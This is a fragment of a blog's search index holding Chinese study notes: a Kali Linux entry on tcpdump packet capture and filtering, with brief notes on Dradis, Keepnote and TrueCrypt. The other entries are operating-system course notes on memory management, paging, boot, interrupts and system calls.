</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八)：TCPDUMP</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB)%EF%BC%9ATCPDUMP/</url>
    <content><![CDATA[<hr>
<h4 id="1-TCPDUMP"><a href="#1-TCPDUMP" class="headerlink" title="1. TCPDUMP"></a>1. TCPDUMP</h4><ul>
<li>NO-GUI的抓包分析工具</li>
<li>Linux、Unix系统默认安装</li>
</ul>
<p>v2. TCPDUMP-抓包</p>
<ul>
<li>抓包<ul>
<li>默认只抓每个数据包的68个字节（一般是数据包头）</li>
<li><strong><code>🔺命令：tcpdump -h（--help选项）</code></strong></li>
<li><strong><code>🔺命令：tcpdump -i（网卡） eth0 -s（size） 0 -w（保存） x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -A（以ASCII码的形式） -r（读取） x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -X（以十六进制的形式）-r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -i eth0 tcp（协议类型） port（端口） x</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-TCPDUMP-筛选"><a href="#3-TCPDUMP-筛选" class="headerlink" title="3. TCPDUMP-筛选"></a>3. TCPDUMP-筛选</h4><ul>
<li>筛选<ul>
<li><strong><code>🔺命令：tcpdump -n（不做域名解析）-r x.pcap | awk &#39;{print $3} &#39;| sort -u</code></strong></li>
<li><strong><code>🔺命令：tcpdump -n src（源地址） host ip地址 -r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -n dst（目标地址） host ip地址 -r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -n tcp port x -r x.pcap</code></strong></li>
<li><strong><code>🔺命令：tcpdump -nX（不做域名解析，十六进制形式）tcp port x -r x.pcap</code></strong></li>
</ul>
</li>
</ul>
<h4 id="4-TCPDUMP-高级筛选"><a href="#4-TCPDUMP-高级筛选" class="headerlink" title="4. TCPDUMP-高级筛选"></a>4. TCPDUMP-高级筛选</h4><blockquote>
<pre><code>ACK+PSH数据同时为1，即为数据传输真正开始的位置
ACK为1，确认位 → A
FIN为1，结束位 → F
SYN为1，同步位 → S
PSH为1，推送位 → P
RST为1，复位位 → R
URG为1，紧急位 → U
CWR、ECE（暂未知）
CEUAPRSF 0001100 = 24 in decimal</code></pre></blockquote>
<ul>
<li>高级筛选<ul>
<li><strong><code>🔺命令：tcpdump -A -n &#39;tcp[13]=24&#39;（tcp的第十三字节为ACK+PSH）-r x.pcap</code></strong></li>
</ul>
</li>
</ul>
<h4 id="5-过程文档记录"><a href="#5-过程文档记录" class="headerlink" title="5. 过程文档记录"></a>5. 过程文档记录</h4><ul>
<li>Dradis ▲2019.11.26软件启动失败<ul>
<li>短期临时小团队资源共享</li>
<li>各种插件导入文件</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Dradis:开启 → http://127.0.0.1:3000 → 只需要输入密码即可 → import from file
导入：namp -p IP地址 -oX x.xml → import from file → upload file
导出：右键 → columns → catagory → HTML Export ready</code></pre></blockquote>
<ul>
<li>Keepnote（层级结构）▲2019.11.26新版本无此软件</li>
</ul>
<blockquote>
<pre><code>Keepnote:开启 → file → notebook 
导出：Export notebook → HTML</code></pre></blockquote>
<ul>
<li>Truecrypt（加密工具）▲2019.11.26新版本无此软件，换为VeraCrypt</li>
</ul>
<blockquote>
<pre><code>生成一个文件夹 → 挂载系统 → 拷贝到文件 → 卸载文件（全盘加密时间很长）
Truecrypt:创建 → create Volume（可文件或者硬盘分区）→  Standard Truecrypt volume（Hidden Truecrypt volume隐藏加密，标准加密打开卷里面什么都没用）→ Select file → Encryption Algorithm（加密算法）+Hash Algorithm（哈希算法）→ Volume size → Volume Password → Format option → Cross-Platform Support（挂载支持）→ Volume Format（鼠标滑动生成随机密码）
Truecrypt:使用 → select file → mount → Dismount All
Hidden Truecrypt volume:存在outer volume和Hidden volume</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>第三章、内存技术</title>
    <url>/2019/11/22/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E5%86%85%E5%AD%98%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="第三章、内存技术"><a href="#第三章、内存技术" class="headerlink" title="第三章、内存技术"></a>第三章、内存技术</h2><hr>
<ol>
<li><p>覆盖技术</p>
<ul>
<li>目标：是在较小的可用内存中运行较大的程序。常用于多道程序系统，与分区存储管理配合使用</li>
<li>原理：把程序按照自身逻辑结构，划分为若干个功能上相对独立的程序模块，那些不会同时执行的模块共享同一块内存区域，按时间先后来运行<ul>
<li>必要部分（常用功能）的代码和数据常驻内存</li>
<li>可选部分（不常用功能）在其他程序模块中实现，平时存放在外存中，在需要用到时才装入内存</li>
<li>不存在调用关系的模块不必同装入到内存，从而可以相互覆盖，即这些模块共用一个分区</li>
</ul>
</li>
<li>缺点<ul>
<li>由程序员来把一个大的程序划分为若干个小的功能模块，并确定各个模块之间的覆盖关系，费时费力，增加了编程的复杂度</li>
<li>覆盖模块从外存装入内存，实际上是以时间延长来换取空间节省</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>2.交换技术</p>
<ul>
<li>目标：多道程序在内存中时，让正在运行的程序或需要运行的程序获得更多的内存资源</li>
<li>方法<ul>
<li>可将暂时不能运行的程序送到外存，从而获得空闲内存空间</li>
<li>操作系统把一个进程的整个地址空间的内存保存到外存中（换出swap out），而将外存中的某个进程的地址空间读入到内存中（换入swap in）。换入换出的内容的大小为整个程序的地址空间</li>
</ul>
</li>
<li>问题<ul>
<li>交换时机的确定：何时需要发生交换？只当内存空间不够或由不够的危险时换出</li>
<li>交换区的大小：必须足够大以存放所有用户进程的所有内存映像的拷贝；必须能对这些内存映像进行直接存取</li>
<li>程序换入时的重定位：换出后再换入内存的位置一定要在原来的位置上吗？最好采用动态地址映射的方法</li>
</ul>
</li>
<li>覆盖与交换的区别<ul>
<li>覆盖只能发生在那些相互之间没有调用关系的程序模块之间，因此程序员必须给出程序内的各个模块之间的逻辑覆盖结构</li>
<li>交换技术是以在内存中的程序大小为单位来进行的，它不需要程序员给出各个模块之间的逻辑覆盖结构。换言之，交换发生在内存中程序与管理程序或操作系统之间，而覆盖则发生在运行程序的内部</li>
</ul>
</li>
</ul>
<ol start="3">
<li><p>虚拟存储技术</p>
<ul>
<li>目标<ul>
<li>像覆盖技术那样，不是把程序的所有内容都放到内存中，因而能够运行比当前的空闲空间还要大的程序。但做得更好，由操作系统自动来完成，无须程序员的干涉</li>
<li>像交换技术那样，能够实现进程在内存与外存之间的交换，因而获得更多的空闲内存空间。但做得更好，只对进程的部分内容在内存和外存之间进行交换</li>
</ul>
</li>
<li>程序的局部性</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>程序的局部性（principle of locality）：指程序在执行过程中的一个较短时期，所执行的指令地址和指令的操作数地址，分别局限于一定的区域
时间局限性：一条指令的一次执行和下次执行，一个数据的一次访问和下次访问都集中在一个较短时期内
空间局部性：当前指令和邻近的几条指令，当前访问的数据和邻近的几个数据都集中在一个较小区域内</code></pre></blockquote>
<pre><code>程序编写方法1：                        程序编写方法2：
for(j=0;j&lt;1024;j++)                   for(i=0;i&lt;1024;i++)
for(i=0;i&lt;1024;i++)                   for(j=0;j&lt;1024;j++) 
     A[i][j]=0;                           A[i][j]=0;
结论：编写方法1在4K一页的内存中，共发生了1024*1024次缺页中断
      编写方法2在4k一页的内存中，共发生了1024次缺页中断  </code></pre><ul>
<li>基本概念：可以在页式或段式内存管理的基础上实现<ul>
<li>在装入程序时，不必将全部装入到内存，而只需将当前需要执行的部分页面或段装入到内存，就可让程序开始执行</li>
<li>在程序执行过程中，如果需要执行的指令或访问的数据尚未在内存（称位缺页或缺段），则由处理器通知操作系统将相应的页面或段调入到内存，然后继续执行程序</li>
<li>另一方面，操作系统将内存中暂时不使用的页面或段调出保存在外存上，从而腾出更多空闲空间存放将要装入的程序以及将要调入的页面或段</li>
</ul>
</li>
<li>基本特征<ul>
<li>大的用户空间：通过把物理内存与外存相结合，提供给用户的虚拟内存空间通常大于实际的物理内存，即实现了这两者的分离。如32位的虚拟地址理论上可以访问4GB，而可能计算机上仅有的256MB的物理内存，但硬盘容量大于4GB</li>
<li>部分交换：与交换技术相比较，虚拟存储的调入和调出是对部分虚拟地址空间进行的</li>
<li>不连续性：物理内存分配的不连续，虚拟地址空间使用的不连续</li>
</ul>
</li>
<li>虚拟页式内存管理</li>
</ul>
<blockquote>
<pre><code>大部分虚拟存储系统都采用虚拟页式存储管理技术，即在页式存储管理的基础上，增加请求调页和页面置换功能</code></pre></blockquote>
<ul>
<li>虚拟页式内存管理<ul>
<li>基本思路</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>当一个用户程序要调入内存运行时，不是将该程序的所有页面都装入内存，而是只装入部分的页面，就可启动程序运行</li>
<li>在运行的过程中，如果发现要运行的程序或要访问数据不在内存，则向系统发出缺页中断请求，系统在处理这个中断时，将外存中相应的页面调入内存，使得该程序能够继续运行</li>
<li>页表表项：逻辑页号+访问位+修改位+保护位+驻留位+物理页帧号</li>
</ol>
</blockquote>
<blockquote>
<pre><code>1.驻留位
表示该页是在内存还是在外存。如果该位等于1，表示该页位于内存当中，即该页表项时有效的，可以使用；如果该位等于0，表示该页当前还在外存当中，如果访问该页表项，将导致缺页中断
2.保护位
表示允许对该页做何种类型的访问，如只读、可读写、可执行等
3.修改位
表明此页在内存中是否被修改过。当系统回收该物理页面时，根据此位来决定是否把它的内容写回外存
4.访问位
如果该页面被访问过（包括读操作或写操作），则设置此位，用于页面置换算法</code></pre></blockquote>
<ul>
<li><p>虚拟页式内存管理</p>
<ul>
<li>基本思路</li>
</ul>
<ol start="4">
<li>缺页中断处理过程</li>
</ol>
<ul>
<li>（1）如果在内存中有空闲的物理页面，则分配一物理页帧f，然后转第4步；否则转第2步</li>
<li>（2）采用某种页面置换算法，选择一个将被替换的物理页帧f，它所对应的逻辑页为q。如果该页在内存期间被修改，则需把它写回外存</li>
<li>（3）对q所对应的页表项进行修改，把驻留位置为0</li>
<li>（4）将需要访问的页p装入到物理页面f当中</li>
<li>（5）修改p所对应的页表项的内容，把驻留位置为1，把物理页面帧号置为f</li>
<li>（6）重新运行被中断的指令</li>
</ul>
<ol start="5">
<li><p>后备存储（backing store）</p>
<ul>
<li>在何处保存未被映射的页（交换空间（磁盘或者文件）：特殊格式，用于存储未被映射的页面）</li>
<li>概念<ul>
<li>一个虚拟地址空间的页面可以被映射到一个文件（在二级存储中）中的某个位置</li>
<li>代码段：映射到可执行二进制文件</li>
<li>动态加载的共享程序段：映射到动态调用的库文件</li>
<li>其他段：可能被映射到交换文件（swap file）</li>
</ul>
</li>
</ul>
</li>
</ol>
<ol start="4">
<li>虚拟内存性能</li>
</ol>
</li>
<li><p>为了便于理解分页的开销，使用有效存储器访问时间（EAT）</p>
</li>
<li><p>EAT=访问时间<em>页命中几率+page fault处理时间</em>page fault几率</p>
</li>
</ul>
<pre><code>例子：
访存时间：10ns
磁盘访问时间：5ms
参数p=page fault几率
参数q=dirty  fault几率（读写几率，修改位）
EAT=10（1-p）+5000000p（q+1）</code></pre>]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>第三章、内存分配与形式</title>
    <url>/2019/11/22/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E5%BD%A2%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="第三章、内存分配与形式"><a href="#第三章、内存分配与形式" class="headerlink" title="第三章、内存分配与形式"></a>第三章、内存分配与形式</h2><hr>
<ol>
<li><p><strong>计算机体系结构/内存分层体系</strong></p>
<ul>
<li>基本硬件结构：CPU、内存、设备（I/O）</li>
<li>存储器架构：regisite→ cache→main memory→disk</li>
<li>完成的任务：<ul>
<li>抽象，逻辑地址空间</li>
<li>保护，独立地址空间</li>
<li>共享，访问相同内存</li>
<li>虚拟化，更多的地址空间（硬盘为虚拟内存提供空间）</li>
</ul>
</li>
<li>在操作系统中管理内存的不同方法<ul>
<li>程序重定位</li>
<li>分段</li>
<li>分页</li>
<li>虚拟内存</li>
<li>按需分页虚拟内存 </li>
</ul>
</li>
<li>实现高度依赖硬件 <ul>
<li>必须知道内存架构</li>
<li>MMU（内存管理单元）：硬件组件负责处理CPU的内存访问请求</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>2.<strong>地址空间与地址生成</strong></p>
<ul>
<li>地址空间  <ul>
<li>物理地址空间–硬件支持的地址空间（主存，硬盘）</li>
<li>逻辑地址空间–一个运行的程序所拥有的内存范围 </li>
</ul>
</li>
<li>逻辑地址空间的生成</li>
</ul>
<blockquote>
<p><strong>.c file编译→.s file 汇编→.o file链接→.exe file载入（程序重定向）  程序在内存中</strong></p>
</blockquote>
<ul>
<li><p>逻辑地址空间的生成</p>
<ul>
<li><strong>CPU方面</strong></li>
</ul>
</li>
</ul>
<blockquote>
<p>   1.运算器需要在逻辑地址的内存空间<br>   2. 内存管理单元（MMU）寻找在逻辑地址和物理地址之间的映射<br>   3. 控制器从总线发送在物理地址的内存内容的请求</p>
</blockquote>
<ul>
<li>逻辑地址空间的生成<ul>
<li><strong>内存方面</strong></li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>内存发送物理地址内存的内容给CPU</li>
</ol>
</blockquote>
<ul>
<li>逻辑地址空间的生成<ul>
<li><strong>操作系统方面（安全性检查）</strong> </li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>建立逻辑地址和物理地址之间的映射</li>
<li>设置逻辑地址空间基址（基址寄存器）和界限（界限寄存器→是否存在内存异常）</li>
</ol>
</blockquote>
<ol start="3">
<li><p><strong>连续内存分配</strong></p>
<ul>
<li><p>内部碎片问题</p>
<ul>
<li>空闲内存不能被利用</li>
<li>外部碎片：在分配单元间的未使用内存</li>
<li>内部碎片：在分配单元中的未使用内存</li>
</ul>
</li>
<li><p>分区的动态分配</p>
<ul>
<li>简单的内存管理：</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<ol>
<li>当一个程序准许运行在内存中时，分配一个连续的区间</li>
<li>分配一个连续的内存区间给运行的程序以访问数据</li>
<li>分配策略：1.首次适配  2.最优适配   3.最差适配</li>
</ol>
</blockquote>
<blockquote>
<pre><code>首次适配算法：为了分配N字节，使用第一个可用空闲块以致块的尺寸比N大
最优适配算法：为了分配N字节，使用最小的可用空闲块，以致块的尺寸比N大（小型程序请求）
最差适配算法：为了分配N字节，使用最大可用空闲块，以致块的尺寸比N大（中大型程序请求）</code></pre></blockquote>
<ul>
<li>分区的动态分配<ul>
<li>压缩式碎片整理（内存物理地址的改动，挪动，紧致内存空间）</li>
<li>交换式碎片管理（内存空间已满→虚拟内存）</li>
<li>缺点：</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>有外碎片、内碎片的问题</li>
<li>内存利用率低</li>
<li>有外碎片、内碎片问题</li>
</ol>
</blockquote>
<p>4.<strong>非连续内存分配（分段Segmentation，分页Paging，页表Page table）</strong></p>
<ul>
<li>优点<ul>
<li>一个程序的物理地址空间是非连续的</li>
<li>更好的内存利用和管理</li>
<li>允许共享代码与代码（共享库等）</li>
<li>持动态加载和动态链接</li>
</ul>
</li>
<li>分段（更好的分离和共享）</li>
<li>分页<ul>
<li>划分物理内存至固定大小的帧：大小是2的幂</li>
<li>划分逻辑地址空间至相同大小的页：大小是2的幂</li>
<li>建立方案，转换逻辑地址为物理地址（Pages to frames）：1.页表  2.MMU/TLB</li>
<li>帧（Frame）：物理内存被分割为大小相等的帧</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>一个内存物理地址是一个二元组（f，o）
f---帧号（F位，共有2的F次方个帧）
o--帧内偏移（S位，每帧有2的S次方字节） 
物理地址=2的S次方*f+o</code></pre></blockquote>
<pre><code>    例子：
        16bit的地址空间，9bit（512byte）大小的页帧，物理地址=（3，6）
        所以，（2的9次方）*3+6=1542</code></pre><ul>
<li>页：一个程序的逻辑地址空间被划分位大小相同的页<ul>
<li>页内偏移的大小=帧内偏移的大小</li>
<li>页内大小&lt;&gt;帧号大小</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>一个逻辑地址是一个二元组（p，o）
p-----页号（p位，2的p个页）
o-----页内偏移（s位，每页有2的s次方字节）
虚拟地址=2的s次方*p+o</code></pre></blockquote>
<ul>
<li>页寻址机制<ul>
<li>页映射到帧</li>
<li>页是连续的虚拟内存</li>
<li>帧是非连续的物理内存</li>
<li>不是所有的页都有对应的帧</li>
</ul>
</li>
</ul>
<p>5.<strong>页表</strong></p>
<ul>
<li>每个运行的程序都有一个页表  <ul>
<li>属于程序运行状态，会动态变化</li>
<li>PTBR：页表基址寄存器</li>
</ul>
</li>
<li>具有16位地址的系统<ul>
<li>32KB的物理地址</li>
<li>每页1024byte</li>
</ul>
</li>
<li>分页机制的性能问题<ul>
<li>访问一个内存单元需要2次内存访问</li>
<li>页表可能非常大，如何处理？</li>
</ul>
</li>
<li>TLB（时间上缓解）<ul>
<li>缓存近期访问的页帧转换表项</li>
<li>TLB使用associative menory（关联内存）实现，具备快速访问性能   </li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>如果TLB命中，物理页号很快被获取；如果TLB未命中，对应的表项被更新到TLB中</code></pre></blockquote>
<ul>
<li>二级页表（时间换取空间）</li>
</ul>
<blockquote>
<pre><code>多级页表，通过页号分位K个部分，来实现多级间接页表（建立页表“树”）</code></pre></blockquote>
<ul>
<li>基于页寄存器（Page Registers）的方案<ul>
<li>每个帧和一个寄存器关联，寄存器内容包括:</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>Residence bit:此帧是否被使用</li>
<li>Occupier：对应的页号P</li>
<li>Protection bits：保护位</li>
</ol>
</blockquote>
<ul>
<li><p>基于页寄存器（Page Registers）的方案</p>
<ul>
<li>利</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>转换表的大小相对于物理内存来说很小</li>
<li>转换表的大小跟逻辑地址空间的大小无关</li>
</ol>
</blockquote>
<ul>
<li>基于页寄存器（Page Registers）的方案   <ul>
<li>弊</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>需要的信息对调了，即根据帧号可找到页号</li>
<li>如果转换回来？根据页号找到帧号</li>
<li>在需要在反向页表中搜索想要的页号</li>
</ol>
</blockquote>
<ul>
<li>基于关联内存（associative menory）的方案<ul>
<li>如果帧数较少，页寄存器可以被放置在关联内存中</li>
<li>在关联内存中查找逻辑页号</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>成功：帧号被提起</li>
<li>失败：页错误异常（Page fault）</li>
</ol>
</blockquote>
<ul>
<li><p>基于关联内存（associative menory）的方案</p>
<ul>
<li>限制因素：大量的关联内存非常昂贵</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>难以在单个时钟周期内完成</li>
<li>耗电</li>
</ol>
</blockquote>
<ul>
<li>基于哈希（hash）查找的方案<ul>
<li>对页号做哈希计算，为了在“帧表”（每帧拥有一个表项）中获取对应的帧号</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>第二章</title>
    <url>/2019/11/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
    <content><![CDATA[<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><hr>
<ol>
<li><p><strong>各大设置</strong></p>
<ul>
<li>DISK:存放OS，Bootloader</li>
<li>BIOS（basic input output system）：基本I/O处理系统</li>
<li>Bootloader：加载OS，放在硬盘的第一个主引导扇区</li>
</ul>
</li>
</ol>
<blockquote>
<p>（加电，一个高电平给CPU，CPU默认各引脚状态会将ROM里面的的BIOS及其相关设置放到内存，然后执行BIOS程序）</p>
</blockquote>
<p>2.<strong>开机</strong></p>
<ul>
<li>POST（加电自检），寻找显卡和执行BIOS</li>
<li>将Bootloader从硬盘引导扇区（512字节）加载到地址（0x7c00）</li>
<li>BIOS:跳转到CS:IP=地址（0x7c00）</li>
<li>Bootloader:将操作系统的代码和数据从硬盘加载到内存，跳转到操作系统的起始地址</li>
</ul>
<p>3.<strong>interface：系统调用、异常、中断</strong></p>
<ul>
<li>系统调用（来源于应用程序system call）：应用程序主动向操作系统发出服务请求</li>
<li>异常（来源于不良的应用程序exception）：非法指令或者其他坏的处理状态（如：内存出错）</li>
<li>中断（来源于外设interrupt）：来自不同的硬件设备的计时器和网络的中断</li>
</ul>
<blockquote>
<p>只有内核可以执行特权指令</p>
</blockquote>
<p>  -三者的区别</p>
<pre><code>1.源头
- 中断：外设
- 异常：应用程序意想不到的行为
- 系统调用：应用程序请求操作系统提供服务 
2.处理时间
- 中断：异步（不受控制）
- 异常：同步
- 系统调用：异步或同步
3.响应
- 中断：持续，对用户应用程序是透明
- 异常：杀死或者重新执行意想不到的应用程序指令
- 系统调用：等待和持续</code></pre><p>4.<strong>中断（对应用程序透明）</strong></p>
<ul>
<li>硬件（设置中断标记【CPU初始化】<ul>
<li>将内部、外部事件设置中断标记</li>
<li>中断事件的ID</li>
</ul>
</li>
<li>软件<ul>
<li>保存当前处理状态（保存现场）</li>
<li>中断服务程序处理</li>
<li>清理中断标记</li>
<li>恢复之前保存的处理状态</li>
</ul>
</li>
</ul>
<p>5.<strong>异常</strong></p>
<ul>
<li>保存现场</li>
<li>异常处理 <ul>
<li>杀死产生了异常的程序</li>
<li>重新执行异常指令</li>
</ul>
</li>
<li>恢复现场</li>
</ul>
<p>6.<strong>系统调用</strong></p>
<blockquote>
<pre><code>应用程序调用printf（）时，会触发系统调用write（）
程序访问主要是通过高层次的API接口而不是直接进行系统调用  
Win32 API用于Windows
POSIX API应用于POSIX-based systems（包括UNIX,Linux,Mac OS X的所有版本)
Java API用于JAVA虚拟机（JVM）</code></pre></blockquote>
<blockquote>
<pre><code>用户态和内核态
函数调用：一个相同堆栈空间实现
系统调用：两个不同的堆栈空间实现</code></pre></blockquote>
<p>7.<strong>跨越操作系统边界的开销</strong></p>
<ul>
<li>在执行时间上的开销超过程序调用</li>
<li>开销<ul>
<li>建立中断/异常/系统调用号与对应服务例程映射关系的初始化开销</li>
<li>建立内核堆栈</li>
<li>验证参数</li>
<li>内核态映射到用户态的地址空间，更新页面映射权限，内存拷贝（不是指针传递，需从内核态拷贝到用户态</li>
<li>内核态独立地址空间TLsB</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>第一章</title>
    <url>/2019/11/20/%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    <content><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><hr>
<ol>
<li><p><strong>操作系统架层次结构</strong></p>
<ul>
<li>硬件之上</li>
<li>应用程序之下</li>
</ul>
</li>
<li><p><u>Linux、Window、Android的界面属于外壳（shell），而不是内核（kernel），重点是kernel</u></p>
</li>
<li><p><strong>并发与并行</strong></p>
<ul>
<li>并行: 一个时间点上多个进程（需要多个CPU）</li>
<li>并发：一段时间上多个进程</li>
</ul>
</li>
<li><p><strong>OS Kernel的特征</strong></p>
<ul>
<li>并发，计算机系统中同时存在多个运行的程序，需要OS管理和调度</li>
<li>共享，“同时”访问，互斥共享</li>
<li>虚拟，利用多道程序设计技术，让每个用户都觉得有一个计算机专门为他服务</li>
<li>异步，程序的执行不是一贯而底，而是走走停停，向前推进的速度是不可预知的，但只要运行的环境相同，OS需要保证程序运行的结果也要相同</li>
</ul>
</li>
<li><p><strong>综合课程–结合许多不同的课程</strong></p>
<ul>
<li>程序设计语言</li>
<li>数据结构</li>
<li>算法</li>
<li>计算机体系结构</li>
<li>材料</li>
<li>操作系统概念和原理，源代码</li>
<li>技能</li>
<li>操作系统的设计和实现</li>
</ul>
</li>
<li><p><strong>顶级会议–SOSP,USENIX(每两年一次会议)</strong></p>
<p><u>IPv6没有GFW</u></p>
</li>
<li><p><strong>操作系统需要权衡：</strong></p>
<ul>
<li>空间与时间</li>
<li>性能和可预测性</li>
<li>公平和性能</li>
</ul>
</li>
<li><p><strong>硬件方面</strong></p>
<ul>
<li>良好得硬件资源</li>
<li>合理的资源分配（例如：硬盘速度跟CPU、内存相差很多，操作系统需要去调节）</li>
</ul>
</li>
</ol>
<ol start="9">
<li><p><strong>操作系统实例</strong></p>
<ul>
<li>Unix家族：Unix  BSD</li>
<li>Linux家族：redhat、debian、ubuntu、fedoro</li>
<li>Window家族：Window7、Window10</li>
</ul>
</li>
<li><p><strong>操作系统的历史</strong></p>
<ul>
<li>早期计算机使用纸带传输程序和数据（操作系统只起到加载作用）</li>
<li>批处理阶段（CPU等硬件快速发展，计算机速度得到提升）</li>
<li>多道程序设计（内存的容量越来越大、CPU执行多个程序）操作系统中断调度 </li>
<li>分时系统（为了更好的利用计算机资源，并且更好的和用户交互），分时时间片，1/1000s终中断调度（时钟）</li>
<li>个人电脑操作系统PC（提高I/O交互性） </li>
<li>网络的快速发展，出现了分布式的操作系统（Internet传输、数据中心计算）</li>
<li>历代计算机 </li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>主机型计算机AIX/HP-UX（Mainframe compiting） 
个人计算机Window/Linux/BSD（Person computing）
网络计算IOS/Android（Internet computing）
普适计算（Pervasive computing）</code></pre></blockquote>
<ol start="11">
<li><p><strong>操作系统的结构</strong></p>
<ul>
<li>简单操作系统，MS-DOS,不分模块的单体内核（模具化是通过函数去调用的）</li>
<li>微内核的设计，尽可能把内核功能移到用户中间（通过模块之间的消息传递机制）</li>
<li>“外核”，极端的架构，EX kernel作为外核，访问kernel</li>
<li>虚拟机（VMs），VMM虚拟监控机，VMM将单独的机器接口转换成很多的幻象，每个这些接口（虚拟机）是一个原始计算机系统的有效副本，并完成所有的处理器指令</li>
</ul>
</li>
</ol>
<hr>
]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
</search>
